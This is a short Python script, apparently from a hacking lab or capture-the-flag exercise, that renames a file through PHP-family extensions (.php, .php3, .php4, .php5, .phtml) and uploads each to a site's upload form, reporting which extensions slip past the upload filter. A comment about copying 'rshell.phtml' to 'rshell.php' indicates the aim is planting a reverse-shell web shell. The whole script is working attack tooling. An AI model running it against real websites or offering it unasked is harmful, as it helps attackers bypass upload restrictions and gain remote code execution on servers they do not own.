# !/usr/bin/env python
# The purpose of this script is to find allowed file extensions that may
# be uploaded to a website. 
# 
# Note: The file you start with will be replaced with the file allowed.
# cp rshell.phtml rshell.php

import requests
import os

# The target IP address and port with an upload option
ip = "127.0.0.1"
url = f"http://{ip}:1234/internal/index.php"

old_filename = "doesthiswork.php"

#concatinated filename and extension versions
filename = "doesthiswork"
extensions = [".php",".php3",".php4",".php5",".phtml",]


for ext in extensions:

	new_filename = filename + ext
	os.rename(old_filename, new_filename)

	files = {"file": open(new_filename, "rb")}
	r = requests.post(url, files=files)
# On this website, "Extension not allowed" is displayed.
	if "Extension not allowed" in r.text: 
		print(f"{ext} not allowed")
	else:
		print(f"{ext} Seems to be allowed...")

	old_filename = new_filename
